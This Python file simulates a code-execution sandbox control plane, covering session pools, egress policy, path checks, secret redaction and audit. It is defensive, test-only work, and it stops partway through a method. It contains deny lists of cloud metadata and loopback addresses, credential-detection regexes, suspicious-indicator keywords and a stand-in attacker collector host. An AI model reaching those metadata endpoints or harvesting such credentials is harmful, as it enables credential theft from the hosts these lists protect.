#!/usr/bin/env python3
"""Code-execution sandbox with session pools: offline reference simulator.

This single-file, standard-library-only simulator models the control plane an
agent needs before it is allowed to run model-generated code. It demonstrates:

* a ``SessionPool`` Protocol seam with an in-memory fake pool, an anti-pattern
  in-process executor that always refuses, and a gated live adapter stub;
* opaque session identifiers derived with HMAC over tenant, user and
  conversation, so one conversation maps to exactly one sandbox session and
  the model never chooses the identifier;
* caller authorization modelled on a data-plane role assignment on the pool
  plus a token audience check;
* an egress policy that is disabled by default, an exact-host allowlist
  variant, and metadata / loopback / link-local addresses that are always
  denied;
* a static pre-screen that rejects oversized code and credential-like
  material before anything reaches the pool;
* file upload / download with path normalisation and traversal rejection;
* session lifecycle on a logical clock: cooldown expiry, maximum lifetime,
  explicit delete, capacity exhaustion, and surfaced state loss;
* pool selection between a built-in Python pool and a custom-container pool,
  including the observed gap where the built-in MCP endpoint is not available
  on custom-container pools;
* output handling: secret redaction, truncation with a flag, and an artifact
  MIME allowlist with quarantine;
* side-effecting proposals routed to an approval gate instead of being applied;
* audit records with correlation identifiers and no code bodies.

TEST ONLY. Nothing here is a production sandbox. The simulator NEVER executes
submitted code on the host: "code" is a tiny line-oriented mini-language that
is parsed into a tree and walked by a deterministic interpreter with a step
budget. It makes no network calls, reads no credentials, and writes no files.
Role names, API paths, field names, pool types, warm-instance behaviour, MCP
availability and isolation properties are modelled on preview behaviour and
must be verified against current Microsoft Learn documentation.

Usage::

    python sandbox_session_sim.py --self-test
    python sandbox_session_sim.py --demo
"""

from __future__ import annotations

import argparse
import ast
import hashlib
import hmac
import ipaddress
import json
import os
import re
import sys
from dataclasses import dataclass, field
from typing import Callable, Dict, FrozenSet, List, Optional, Protocol, Sequence, Set, Tuple
from urllib.parse import urlsplit

# ---------------------------------------------------------------------------
# Constants. Names marked "verify" are preview-era values; confirm them
# against current Microsoft Learn documentation before relying on them.
# ---------------------------------------------------------------------------

LIVE_ENV_VAR = "SANDBOX_SIM_LIVE"

# Data-plane role the calling identity needs on the pool (verify name).
SESSION_EXECUTOR_ROLE = "Azure ContainerApps Session Executor"
# Token scope / audience for the sessions data plane (verify).
SESSIONS_TOKEN_SCOPE = "https://dynamicsessions.io/.default"
SESSIONS_TOKEN_AUDIENCE = "https://dynamicsessions.io"
POOL_MANAGEMENT_ENDPOINT = "https://<pool-management-endpoint>"
API_VERSION_PLACEHOLDER = "<api-version>"
POOL_SCOPE_TEMPLATE = (
    "/subscriptions/<subscription-id>/resourceGroups/<resource-group>"
    "/providers/Microsoft.App/sessionPools/{name}"
)

SESSION_ID_PREFIX = "cx-"
SESSION_ID_DIGEST_CHARS = 40
SESSION_ID_MIN_CHARS = 4  # observed lower bound via the built-in MCP tool (verify)
SESSION_ID_MAX_CHARS = 128  # observed upper bound (verify)
SESSION_ID_PATTERN = re.compile(r"^[A-Za-z0-9-]+$")
SESSION_ID_SEPARATOR = "\x1f"

SANDBOX_DATA_ROOT = "/mnt/data"  # session working directory (verify)
MAX_PATH_CHARS = 200

TENANT_CONTOSO = "tenant-contoso"
TENANT_FABRIKAM = "tenant-fabrikam"
USER_A = "contoso-analyst-1"
USER_B = "contoso-analyst-2"
CONV_SALES = "conv-sales-review"
CONV_FORECAST = "conv-forecast"

BROKER_IDENTITY = "mi-contoso-analysis-broker"
OTHER_IDENTITY = "mi-unrelated-workload"

ALLOWED_DATA_HOST = "data.contoso.example"
EXFIL_HOST = "collector.attacker.example"

# Instance metadata, platform wire server, loopback and unspecified addresses.
# These are denied regardless of egress mode or allowlist content.
METADATA_AND_LOCAL_HOSTS: FrozenSet[str] = frozenset(
    {
        "169.254.169.254",
        "168.63.129.16",
        "localhost",
        "127.0.0.1",
        "::1",
        "0.0.0.0",
        "metadata",
    }
)
_HOSTNAME_RE = re.compile(r"^(?=.{1,253}$)([a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?)(\.[a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?)+$")

BUILTIN_POOL_PACKAGES: FrozenSet[str] = frozenset({"numpy", "pandas", "matplotlib"})
CUSTOM_IMAGE_PACKAGES: FrozenSet[str] = frozenset(
    {"numpy", "pandas", "matplotlib", "polars", "pyarrow"}
)

# What the resource provider says it supports, per region. The lesson from
# preview testing: ask the resource provider, not the documentation.
REGION_POOL_TYPES: Dict[str, Tuple[str, ...]] = {
    "region-a": ("PythonLTS", "CustomContainer", "NodeLTS", "Shell"),
    "region-b": ("PythonLTS", "CustomContainer"),
}
LANGUAGE_POOL_TYPES: Dict[str, str] = {
    "python": "PythonLTS",
    "javascript": "NodeLTS",
    "shell": "Shell",
}

# Demo-only derivation key, computed so no key material appears in source.
# In production the key lives in Key Vault and is fetched by the broker.
DEMO_DERIVATION_KEY = hashlib.sha256(b"demo-only placeholder, not a secret").digest()
ALTERNATE_DERIVATION_KEY = hashlib.sha256(b"demo-only rotated placeholder").digest()

# What an agent host process typically carries. In-process execution would
# hand all of this to generated code. Values are placeholders.
SIMULATED_AGENT_HOST_ENV: Dict[str, str] = {
    "IDENTITY_ENDPOINT": "<agent-host-identity-endpoint>",
    "IDENTITY_HEADER": "<agent-host-identity-header>",
    "PROJECT_ENDPOINT": "<foundry-project-endpoint>",
    "STATE_STORE_ENDPOINT": "<state-store-endpoint>",
}
CREDENTIAL_BEARING_ENV = ("IDENTITY_ENDPOINT", "IDENTITY_HEADER")

# What a sandbox session sees: nothing from the agent host.
SANDBOX_SESSION_ENV: Dict[str, str] = {
    "HOME": "/home/sandbox",
    "PATH": "/usr/local/bin:/usr/bin:/bin",
    "LANG": "C.UTF-8",
}

# Credential-like material. Patterns are assembled from fragments so this
# source file does not itself look like it contains a credential.
SECRET_PATTERNS: Tuple[Tuple[str, "re.Pattern[str]"], ...] = (
    ("storage-account-key", re.compile("Account" + r"Key=[A-Za-z0-9+/=]{20,}")),
    ("sas-signature", re.compile(r"[?&]" + "sig" + r"=[A-Za-z0-9%+/=]{20,}")),
    ("private-key-block", re.compile("-----BEGIN " + r"[A-Z ]*PRIVATE KEY-----")),
    ("bearer-token", re.compile(r"(?i)bearer\s+[A-Za-z0-9._~+/=-]{20,}")),
    ("assigned-credential", re.compile(r"(?i)\b(password|client_secret|api_key)\s*=\s*\S{8,}")),
)

# Indicators that are logged (not blocked) by the pre-screen. The sandbox is
# the control; the pre-screen only adds signal for detection and review.
SUSPICIOUS_INDICATORS: Tuple[Tuple[str, str], ...] = (
    ("fetch ", "network-call"),
    ("getenv ", "environment-read"),
    ("spawn ", "process-spawn"),
    ("repeat forever", "unbounded-loop"),
    ("169.254.", "metadata-address"),
    ("propose ", "side-effect-proposal"),
)

ALLOWED_BOUNDARIES: FrozenSet[str] = frozenset({"remote-sandbox", "remote-sandbox (simulated)"})

TRUNCATION_MARKER = "\n...[output truncated by broker]"


# ---------------------------------------------------------------------------
# Error taxonomy. Codes and HTTP mappings are this pattern's contract, not the
# platform's; map platform errors onto them in the live adapter.
# ---------------------------------------------------------------------------


class SandboxError(Exception):
    code = "SandboxError"
    http_status = 500
    retryable = False

    def __init__(self, message: str, **details: object) -> None:
        super().__init__(message)
        self.message = message
        self.details: Dict[str, object] = dict(details)

    def to_dict(self) -> Dict[str, object]:
        error: Dict[str, object] = {
            "code": self.code,
            "message": self.message,
            "httpStatus": self.http_status,
            "retryable": self.retryable,
        }
        if self.details:
            error["details"] = {key: self.details[key] for key in sorted(self.details)}
        return {"error": error}


class PolicyRejected(SandboxError):
    code = "PolicyRejected"
    http_status = 400


class CodeTooLarge(PolicyRejected):
    code = "CodeTooLarge"
    http_status = 413


class SecretInCode(PolicyRejected):
    code = "SecretInCode"


class ClientSuppliedSessionId(PolicyRejected):
    code = "ClientSuppliedSessionId"


class InvalidSessionIdentifier(PolicyRejected):
    code = "InvalidSessionIdentifier"


class PathRejected(PolicyRejected):
    code = "PathRejected"


class MimeRejected(PolicyRejected):
    code = "MimeRejected"
    http_status = 415


class FileTooLarge(PolicyRejected):
    code = "FileTooLarge"
    http_status = 413


class Unauthorized(SandboxError):
    code = "Unauthorized"
    http_status = 401


class Forbidden(SandboxError):
    code = "Forbidden"
    http_status = 403


class FileNotFoundInSession(SandboxError):
    code = "FileNotFoundInSession"
    http_status = 404


class CapacityExceeded(SandboxError):
    code = "CapacityExceeded"
    http_status = 429
    retryable = True


class McpNotAvailable(SandboxError):
    code = "McpNotAvailable"
    http_status = 409


class InvalidPoolConfiguration(SandboxError):
    code = "InvalidPoolConfiguration"
    http_status = 400


class InvalidPoolType(InvalidPoolConfiguration):
    code = "InvalidPoolType"


class InProcessExecutionRefused(SandboxError):
    code = "InProcessExecutionRefused"
    http_status = 400


class LiveAdapterGated(NotImplementedError):
    """Raised when the live adapter is constructed without the opt-in flag."""


# ---------------------------------------------------------------------------
# Value objects
# ---------------------------------------------------------------------------


@dataclass(frozen=True)
class EndUser:
    """The signed-in end user and the conversation the request belongs to."""

    tenant_id: str
    user_id: str
    conversation_id: str


@dataclass(frozen=True)
class CallerToken:
    """A bearer token as the pool data plane would see it (simulated)."""

    principal: str
    audience: str


@dataclass(frozen=True)
class ExecutionLimits:
    """Per-execution resource limits inside the sandbox.

    These are abstract simulator units (statements, processes, memory units,
    bytes of simulated file content), not wall-clock or hardware figures.
    """

    step_budget: int = 200
    max_processes: int = 8
    max_memory_units: int = 64
    max_file_bytes: int = 4096
    max_files: int = 16
    max_pool_stdout_bytes: int = 8192


@dataclass(frozen=True)
class BrokerPolicy:
    """Limits the broker enforces before and after the pool call."""

    max_code_bytes: int = 2048
    max_stdout_bytes: int = 512
    max_download_bytes: int = 2048
    max_upload_bytes: int = 4096
    upload_mime_allowlist: FrozenSet[str] = frozenset(
        {"text/csv", "text/plain", "application/json"}
    )
    artifact_mime_allowlist: FrozenSet[str] = frozenset(
        {"text/csv", "text/plain", "application/json", "image/png"}
    )


def _canonical_ip(host: str) -> Optional[ipaddress._BaseAddress]:
    """Parse dotted, bracketed, decimal-integer and hex-integer IP forms."""

    candidate = host.strip("[]")
    try:
        return ipaddress.ip_address(candidate)
    except ValueError:
        pass
    try:
        if candidate.isdigit():
            value = int(candidate)
        elif candidate.lower().startswith("0x"):
            value = int(candidate, 16)
        else:
            return None
    except ValueError:
        return None
    if 0 <= value < 2 ** 32:
        return ipaddress.ip_address(value)
    return None


def _is_metadata_or_local(host: str) -> bool:
    lowered = host.lower().strip("[]")
    if lowered in METADATA_AND_LOCAL_HOSTS:
        return True
    ip = _canonical_ip(lowered)
    if ip is None:
        return False
    if str(ip) in METADATA_AND_LOCAL_HOSTS:
        return True
    return bool(ip.is_link_local or ip.is_loopback or ip.is_unspecified)


@dataclass(frozen=True)
class EgressPolicy:
    """Outbound network policy for sandbox sessions.

    ``disabled`` mirrors the egress-disabled pool setting. ``allowlist`` models
    a custom network with a firewall that permits exact host names only.
    """

    mode: str = "disabled"
    allow_hosts: Tuple[str, ...] = ()

    def validate(self) -> None:
        if self.mode not in ("disabled", "allowlist"):
            raise InvalidPoolConfiguration("unknown egress mode", mode=self.mode)
        if self.mode == "disabled" and self.allow_hosts:
            raise InvalidPoolConfiguration(
                "allow_hosts must be empty when egress is disabled"
            )
        if self.mode == "allowlist" and not self.allow_hosts:
            raise InvalidPoolConfiguration("allowlist mode needs at least one host")
        for host in self.allow_hosts:
            lowered = host.lower()
            if "*" in lowered:
                raise InvalidPoolConfiguration("wildcards are not allowed", host=host)
            if _canonical_ip(lowered) is not None:
                raise InvalidPoolConfiguration("IP literals are not allowed", host=host)
            if _is_metadata_or_local(lowered):
                raise InvalidPoolConfiguration("metadata/local hosts are never allowed", host=host)
            if not _HOSTNAME_RE.match(lowered):
                raise InvalidPoolConfiguration("not a fully qualified host name", host=host)

    def decide(self, url: str) -> Tuple[bool, str]:
        try:
            parts = urlsplit(url)
            host = (parts.hostname or "").lower()
            has_userinfo = parts.username is not None or parts.password is not None
        except ValueError:
            return False, "unparseable-url"
        if not host:
            return False, "no-host"
        if _is_metadata_or_local(host):
            return False, "metadata-or-local-address"
        if self.mode != "allowlist":
            return False, "egress-disabled"
        if parts.scheme != "https":
            return False, "scheme-not-allowed"
        if has_userinfo:
            return False, "userinfo-not-allowed"
        if _canonical_ip(host) is not None:
            return False, "ip-literal-not-allowed"
        if host in {h.lower() for h in self.allow_hosts}:
            return True, "allowlisted-host"
        return False, "host-not-allowlisted"


@dataclass(frozen=True)
class PoolSpec:
    """Desired pool configuration, as an infrastructure template would state it.

    Lifecycle values are logical-clock ticks in the simulator.
    """

    name: str
    pool_type: str
    region: str = "region-a"
    max_concurrent_sessions: int = 4
    ready_session_instances: int = 0
    cooldown_ticks: int = 5
    max_lifetime_ticks: int = 20
    egress: EgressPolicy = EgressPolicy()
    mcp_enabled: bool = False
    image_packages: FrozenSet[str] = BUILTIN_POOL_PACKAGES
    limits: ExecutionLimits = ExecutionLimits()
    image_runs_as_non_root: bool = False


@dataclass
class PoolRecord:
    """What the resource provider actually stored (may differ from the spec)."""

    spec: PoolSpec
    scope: str
    effective_ready_instances: Optional[int]
    effective_mcp_enabled: bool
    warnings: List[str] = field(default_factory=list)


@dataclass
class SessionFile:
    path: str
    content: bytes
    mime: str


@dataclass
class SessionState:
    identifier: str
    created_tick: int
    last_used_tick: int
    env: Dict[str, str]
    files: Dict[str, SessionFile] = field(default_factory=dict)
    variables: Dict[str, str] = field(default_factory=dict)
    executions: int = 0


@dataclass
class ProgramOutcome:
    status: str
    stdout: str
    stderr: str
    steps_used: int
    artifacts: List[Dict[str, object]] = field(default_factory=list)
    proposals: List[Dict[str, object]] = field(default_factory=list)
    egress_attempts: List[Dict[str, object]] = field(default_factory=list)


@dataclass(frozen=True)
class ExecuteRequest:
    identifier: str
    code: str
    timeout_hint: int = 0

    def to_wire(self, endpoint: str = POOL_MANAGEMENT_ENDPOINT) -> Dict[str, object]:
        """Shape of the data-plane call (preview shape; verify field names)."""

        body: Dict[str, object] = {
            "codeInputType": "Inline",
            "executionType": "Synchronous",
            "code": self.code,
        }
        if self.timeout_hint:
            body["timeoutInSeconds"] = self.timeout_hint
        return {
            "method": "POST",
            "url": (
                endpoint
                + "/executions?api-version="
                + API_VERSION_PLACEHOLDER
                + "&identifier="
                + self.identifier
            ),
            "headers": {"Authorization": "Bearer <token for " + SESSIONS_TOKEN_SCOPE + ">"},
            "body": body,
        }


@dataclass
class ExecuteResponse:
    status: str
    stdout: str
    stderr: str
    session_is_new: bool
    steps_used: int
    artifacts: List[Dict[str, object]] = field(default_factory=list)
    proposals: List[Dict[str, object]] = field(default_factory=list)
    egress_attempts: List[Dict[str, object]] = field(default_factory=list)


@dataclass(frozen=True)
class FileBlob:
    filename: str
    mime: str
    content: bytes


@dataclass
class PrescreenVerdict:
    allowed: bool
    code_bytes: int
    code_sha256: str
    findings: List[str] = field(default_factory=list)


@dataclass
class AuditRecord:
    correlation_id: str
    event: str
    tenant_ref: str
    user_ref: str
    session_ref: str
    pool: str
    outcome: str
    details: Dict[str, object] = field(default_factory=dict)

    def to_dict(self) -> Dict[str, object]:
        return {
            "correlationId": self.correlation_id,
            "event": self.event,
            "tenantRef": self.tenant_ref,
            "userRef": self.user_ref,
            "sessionRef": self.session_ref,
            "pool": self.pool,
            "outcome": self.outcome,
            "details": self.details,
        }


@dataclass(frozen=True)
class WorkloadNeeds:
    needs_mcp: bool = False
    packages: FrozenSet[str] = frozenset()
    language: str = "python"


@dataclass
class PoolDecision:
    pool_type: str
    access_path: str
    reasons: List[str] = field(default_factory=list)
    warnings: List[str] = field(default_factory=list)


# ---------------------------------------------------------------------------
# Session identifiers and paths
# ---------------------------------------------------------------------------


def validate_session_identifier(identifier: str) -> None:
    if not isinstance(identifier, str):
        raise InvalidSessionIdentifier("identifier must be a string")
    if not SESSION_ID_MIN_CHARS <= len(identifier) <= SESSION_ID_MAX_CHARS:
        raise InvalidSessionIdentifier(
            "identifier length out of bounds",
            length=len(identifier),
            min_chars=SESSION_ID_MIN_CHARS,
            max_chars=SESSION_ID_MAX_CHARS,
        )
    if not SESSION_ID_PATTERN.match(identifier):
        raise InvalidSessionIdentifier("identifier has characters outside [A-Za-z0-9-]")


class SessionIdDeriver:
    """Derives one opaque, stable identifier per (tenant, user, conversation).

    HMAC keeps the identifier unguessable without the key and keeps raw tenant,
    user and conversation values out of platform logs.
    """

    def __init__(self, key_provider: "DerivationKeyProvider") -> None:
        self._keys = key_provider

    def derive(self, user: EndUser) -> str:
        parts = (user.tenant_id, user.user_id, user.conversation_id)
        for part in parts:
            if not part or SESSION_ID_SEPARATOR in part:
                raise PolicyRejected("tenant, user and conversation must be non-empty")
        material = SESSION_ID_SEPARATOR.join(("v1",) + parts).encode("utf-8")
        digest = hmac.new(self._keys.current_key(), material, hashlib.sha256).hexdigest()
        identifier = SESSION_ID_PREFIX + digest[:SESSION_ID_DIGEST_CHARS]
        validate_session_identifier(identifier)
        return identifier


def normalize_session_path(path: str) -> str:
    """Return a canonical path under the session data root or raise PathRejected."""

    if not isinstance(path, str) or not path:
        raise PathRejected("empty path")
    if len(path) > MAX_PATH_CHARS:
        raise PathRejected("path too long", length=len(path))
    if "\x00" in path or any(ord(ch) < 32 for ch in path):
        raise PathRejected("control characters in path")
    if "\\" in path:
        raise PathRejected("backslashes are not allowed")
    if "%" in path:
        raise PathRejected("percent-encoded paths are not allowed")
    if re.match(r"^[A-Za-z]:", path):
        raise PathRejected("drive-letter paths are not allowed")
    if path.startswith("/"):
        prefix = SANDBOX_DATA_ROOT + "/"
        if not path.startswith(prefix):
            raise PathRejected("absolute paths must stay under the session data root")
        relative = path[len(prefix):]
    else:
        relative = path
    segments = relative.split("/")
    if any(segment == ".." for segment in segments):
        raise PathRejected("parent-directory segments are not allowed")
    cleaned = [segment for segment in segments if segment not in ("", ".")]
    if not cleaned:
        raise PathRejected("path names a directory, not a file")
    return SANDBOX_DATA_ROOT + "/" + "/".join(cleaned)


# ---------------------------------------------------------------------------
# Protocol seams
# ---------------------------------------------------------------------------


class SessionPool(Protocol):
    """Where generated code runs. Only remote sandboxes are acceptable."""

    isolation_boundary: str
    pool_name: str
    pool_type: str

    def execute(self, token: Optional[CallerToken], request: ExecuteRequest) -> ExecuteResponse: ...

    def upload_file(
        self, token: Optional[CallerToken], identifier: str, blob: FileBlob
    ) -> Dict[str, object]: ...

    def download_file(
        self, token: Optional[CallerToken], identifier: str, path: str
    ) -> FileBlob: ...

    def list_files(self, token: Optional[CallerToken], identifier: str) -> List[str]: ...

    def delete_session(self, token: Optional[CallerToken], identifier: str) -> bool: ...

    def mcp_endpoint(self) -> str: ...


class TokenProvider(Protocol):
    def get_token(self, scope: str) -> CallerToken: ...


class DerivationKeyProvider(Protocol):
    def current_key(self) -> bytes: ...


class ApprovalGate(Protocol):
    def submit(self, proposal: Dict[str, object]) -> str: ...

    def pending(self) -> List[Dict[str, object]]: ...


class AuditSink(Protocol):
    def emit(self, record: AuditRecord) -> None: ...


# ---------------------------------------------------------------------------
# In-memory fakes
# ---------------------------------------------------------------------------


class LogicalClock:
    """A tick counter. Lifecycle is expressed in ticks, never wall-clock time."""

    def __init__(self) -> None:
        self._now = 0

    def now(self) -> int:
        return self._now

    def advance(self, ticks: int = 1) -> int:
        if ticks < 0:
            raise ValueError("clock cannot go backwards")
        self._now += ticks
        return self._now


class RoleAssignments:
    """Role assignments at a scope (simulated Azure RBAC)."""

    def __init__(self) -> None:
        self._assignments: Set[Tuple[str, str, str]] = set()

    def grant(self, principal: str, role: str, scope: str) -> None:
        self._assignments.add((principal, role, scope))

    def revoke(self, principal: str, role: str, scope: str) -> None:
        self._assignments.discard((principal, role, scope))

    def has(self, principal: str, role: str, scope: str) -> bool:
        return (principal, role, scope) in self._assignments


class FakeResourceProvider:
    """Control plane for pools, with the preview quirks this pattern guards against."""

    def __init__(self, region: str = "region-a") -> None:
        if region not in REGION_POOL_TYPES:
            raise InvalidPoolConfiguration("unknown region", region=region)
        self.region = region
        self._pools: Dict[str, PoolRecord] = {}

    def _validate_pool_type(self, pool_type: str) -> None:
        valid = REGION_POOL_TYPES[self.region]
        if pool_type not in valid:
            raise InvalidPoolType(
                "pool type is not supported in this region",
                requested=pool_type,
                region=self.region,
                valid_types=list(valid),
            )

    def discover_pool_types(self) -> Tuple[str, ...]:
        """Ask the resource provider: an invalid type returns the valid list."""

        try:
            self._validate_pool_type("__probe-invalid-type__")
        except InvalidPoolType as err:
            return tuple(err.details["valid_types"])  # type: ignore[arg-type]
        return ()

    def create_pool(self, spec: PoolSpec) -> PoolRecord:
        if spec.region != self.region:
            raise InvalidPoolConfiguration("pool region does not match provider region")
        self._validate_pool_type(spec.pool_type)
        spec.egress.validate()
        if spec.max_concurrent_sessions < 1:
            raise InvalidPoolConfiguration("max concurrent sessions must be at least one")
        if spec.cooldown_ticks < 1 or spec.max_lifetime_ticks < spec.cooldown_ticks:
            raise InvalidPoolConfiguration("cooldown must be positive and not exceed max lifetime")
        warnings: List[str] = []
        effective_ready: Optional[int]
        if spec.pool_type == "CustomContainer":
            if spec.ready_session_instances < 1:
                raise InvalidPoolConfiguration(
                    "custom-container pools rejected a ready-instance count of zero in "
                    "preview testing; at least one instance stays warm and billable"
                )
            effective_ready = spec.ready_session_instances
            if spec.image_runs_as_non_root:
                warnings.append(
                    "image declares a non-root USER; container startup failed in preview "
                    "testing with this change - keep the base image user unless verified"
                )
        else:
            effective_ready = None
            if spec.ready_session_instances:
                warnings.append(
                    "ready-instance setting is not honoured on managed pools (observed in "
                    "preview); warmth is platform-managed - read back the configuration"
                )
        effective_mcp = spec.mcp_enabled
        if spec.mcp_enabled and spec.pool_type != "PythonLTS":
            effective_mcp = False
            warnings.append(
                "MCP setting was silently dropped on this pool type (observed in preview); "
                "read-back shows it disabled - use the built-in Python pool or your own front"
            )
        record = PoolRecord(
            spec=spec,
            scope=POOL_SCOPE_TEMPLATE.format(name=spec.name),
            effective_ready_instances=effective_ready,
            effective_mcp_enabled=effective_mcp,
            warnings=warnings,
        )
        self._pools[spec.name] = record
        return record

    def read_back(self, name: str) -> Dict[str, object]:
        record = self._pools[name]
        return {
            "name": record.spec.name,
            "poolType": record.spec.pool_type,
            "readySessionInstances": record.effective_ready_instances,
            "mcpEnabled": record.effective_mcp_enabled,
            "egress": record.spec.egress.mode,
            "maxConcurrentSessions": record.spec.max_concurrent_sessions,
        }

    def readback_drift(self, name: str) -> List[str]:
        """Fields where what you asked for is not what you got."""

        record = self._pools[name]
        stored = self.read_back(name)
        drift: List[str] = []
        if stored["readySessionInstances"] != record.spec.ready_session_instances:
            if record.spec.ready_session_instances:
                drift.append("readySessionInstances")
        if stored["mcpEnabled"] != record.spec.mcp_enabled:
            drift.append("mcpEnabled")
        return drift


class StaticTokenProvider:
    def __init__(self, principal: str, audience: str = SESSIONS_TOKEN_AUDIENCE) -> None:
        self.principal = principal
        self.audience = audience
        self.requested_scopes: List[str] = []

    def get_token(self, scope: str) -> CallerToken:
        self.requested_scopes.append(scope)
        if scope != SESSIONS_TOKEN_SCOPE:
            raise Unauthorized("unexpected token scope requested", scope=scope)
        return CallerToken(principal=self.principal, audience=self.audience)


class StaticDerivationKeyProvider:
    def __init__(self, key: bytes) -> None:
        if len(key) < 32:
            raise ValueError("derivation key too short")
        self._key = key

    def current_key(self) -> bytes:
        return self._key


class InMemoryApprovalGate:
    """Holds side-effecting proposals. Nothing here ever applies them."""

    def __init__(self) -> None:
        self._items: List[Dict[str, object]] = []

    def submit(self, proposal: Dict[str, object]) -> str:
        canonical = json.dumps(proposal, sort_keys=True).encode("utf-8")
        ticket = "apr-" + hashlib.sha256(canonical).hexdigest()[:12]
        self._items.append({"ticket": ticket, "status": "pending", "proposal": proposal})
        return ticket

    def pending(self) -> List[Dict[str, object]]:
        return [item for item in self._items if item["status"] == "pending"]


class AuditLog:
    def __init__(self) -> None:
        self.records: List[AuditRecord] = []

    def emit(self, record: AuditRecord) -> None:
        self.records.append(record)

    def by_event(self, event: str) -> List[AuditRecord]:
        return [record for record in self.records if record.event == event]

    def as_json(self) -> str:
        return json.dumps([record.to_dict() for record in self.records], sort_keys=True)


# ---------------------------------------------------------------------------
# Deterministic mini-language interpreter (stands in for sandboxed Python).
#
# One statement per line; "#" starts a comment. Statements:
#   set NAME VALUE...        add NAME INT          mul NAME INT
#   print TEXT...            ($name expands a session variable)
#   repeat N | repeat forever   ...   end
#   fetch URL                write PATH TEXT...    read PATH
#   emit PATH MIME NBYTES    spawn N               alloc N
#   getenv NAME              sha256 TEXT...        import PACKAGE
#   propose ACTION ARGS...
# Every statement and every loop iteration costs one step. Nothing is ever
# handed to the host Python runtime.
# ---------------------------------------------------------------------------

_NAME_RE = re.compile(r"^[A-Za-z_][A-Za-z0-9_]*$")
_VAR_RE = re.compile(r"\$([A-Za-z_][A-Za-z0-9_]*)")
_EXTENSION_MIME = {
    ".csv": "text/csv",
    ".txt": "text/plain",
    ".json": "application/json",
    ".png": "image/png",
    ".html": "text/html",
    ".svg": "image/svg+xml",
    ".js": "text/javascript",
    ".sh": "text/x-shellscript",
}


@dataclass
class _Node:
    op: str
    args: List[str]
    line: int
    count: Optional[int] = None
    body: List["_Node"] = field(default_factory=list)


class _ParseError(Exception):
    pass


class _ProgramError(Exception):
    def __init__(self, kind: str, message: str) -> None:
        super().__init__(message)
        self.kind = kind
        self.message = message


class _BudgetExceeded(Exception):
    pass


class _ResourceLimit(Exception):
    pass


def parse_program(code: str) -> List[_Node]:
    root: List[_Node] = []
    stack: List[List[_Node]] = [root]
    for number, raw in enumerate(code.splitlines(), start=1):
        line = raw.strip()
        if not line or line.startswith("#"):
            continue
        tokens = line.split()
        op = tokens[0].lower()
        args = tokens[1:]
        if op == "repeat":
            if len(args) != 1:
                raise _ParseError("line %d: repeat needs a count or 'forever'" % number)
            if args[0] == "forever":
                count: Optional[int] = None
            elif args[0].isdigit():
                count = int(args[0])
            else:
                raise _ParseError("line %d: repeat count must be a non-negative integer" % number)
            node = _Node(op="repeat", args=args, line=number, count=count)
            stack[-1].append(node)
            stack.append(node.body)
        elif op == "end":
            if len(stack) == 1:
                raise _ParseError("line %d: 'end' without 'repeat'" % number)
            stack.pop()
        else:
            stack[-1].append(_Node(op=op, args=args, line=number))
    if len(stack) != 1:
        raise _ParseError("unterminated 'repeat' block")
    return root


def _guess_mime(path: str) -> str:
    for extension, mime in _EXTENSION_MIME.items():
        if path.lower().endswith(extension):
            return mime
    return "application/octet-stream"


class _Interpreter:
    def __init__(
        self,
        session: SessionState,
        egress: EgressPolicy,
        limits: ExecutionLimits,
        packages: FrozenSet[str],
    ) -> None:
        self.session = session
        self.egress = egress
        self.limits = limits
        self.packages = packages
        self.steps = 0
        self.processes = 1
        self.memory_units = 0
        self.stdout: List[str] = []
        self.artifacts: List[Dict[str, object]] = []
        self.proposals: List[Dict[str, object]] = []
        self.egress_attempts: List[Dict[str, object]] = []
        self._ops: Dict[str, Callable[[List[str], int], None]] = {
            "set": self._op_set,
            "add": self._op_add,
            "mul": self._op_mul,
            "print": self._op_print,
            "fetch": self._op_fetch,
            "write": self._op_write,
            "read": self._op_read,
            "emit": self._op_emit,
            "spawn": self._op_spawn,
            "alloc": self._op_alloc,
            "getenv": self._op_getenv,
            "sha256": self._op_sha256,
            "import": self._op_import,
            "propose": self._op_propose,
        }

    # -- helpers -----------------------------------------------------------

    def _tick(self) -> None:
        self.steps += 1
        if self.steps > self.limits.step_budget:
            raise _BudgetExceeded("step budget of %d exhausted" % self.limits.step_budget)

    def _expand(self, text: str) -> str:
        return _VAR_RE.sub(lambda match: self.session.variables.get(match.group(1), ""), text)

    def _int_arg(self, value: str, line: int) -> int:
        expanded = self._expand(value)
        try:
            return int(expanded)
        except ValueError:
            raise _ProgramError("ValueError", "line %d: '%s' is not an integer" % (line, expanded))

    def _need(self, args: List[str], count: int, line: int, usage: str) -> None:
        if len(args) < count:
            raise _ProgramError("SyntaxError", "line %d: usage: %s" % (line, usage))

    def _sandbox_path(self, raw: str, line: int) -> str:
        try:
            return normalize_session_path(self._expand(raw))
        except PathRejected as err:
            raise _ProgramError("PermissionError", "line %d: %s" % (line, err.message))

    def _store_file(self, path: str, content: bytes, mime: str, line: int) -> None:
        if len(content) > self.limits.max_file_bytes:
            raise _ProgramError("OSError", "line %d: file exceeds session file size limit" % line)
        files = self.session.files
        if path not in files and len(files) >= self.limits.max_files:
            raise _ProgramError("OSError", "line %d: session file count limit reached" % line)
        files[path] = SessionFile(path=path, content=content, mime=mime)

    # -- execution ---------------------------------------------------------

    def run(self, nodes: Sequence[_Node]) -> None:
        for node in nodes:
            self._tick()
            if node.op == "repeat":
                iteration = 0
                while node.count is None or iteration < node.count:
                    self._tick()
                    self.run(node.body)
                    iteration += 1
                continue
            handler = self._ops.get(node.op)
            if handler is None:
                raise _ProgramError("NameError", "line %d: unknown statement '%s'" % (node.line, node.op))
            handler(node.args, node.line)

    # -- statements --------------------------------------------------------

    def _op_set(self, args: List[str], line: int) -> None:
        self._need(args, 1, line, "set NAME VALUE")
        if not _NAME_RE.match(args[0]):
            raise _ProgramError("SyntaxError", "line %d: bad variable name" % line)
        self.session.variables[args[0]] = self._expand(" ".join(args[1:]))

    def _arith(self, args: List[str], line: int, combine: Callable[[int, int], int]) -> None:
        self._need(args, 2, line, "add|mul NAME INT")
        current = self._int_arg(self.session.variables.get(args[0], "0") or "0", line)
        self.session.variables[args[0]] = str(combine(current, self._int_arg(args[1], line)))

    def _op_add(self, args: List[str], line: int) -> None:
        self._arith(args, line, lambda left, right: left + right)

    def _op_mul(self, args: List[str], line: int) -> None:
        self._arith(args, line, lambda left, right: left * right)

    def _op_print(self, args: List[str], line: int) -> None:
        self.stdout.append(self._expand(" ".join(args)))

    def _op_fetch(self, args: List[str], line: int) -> None:
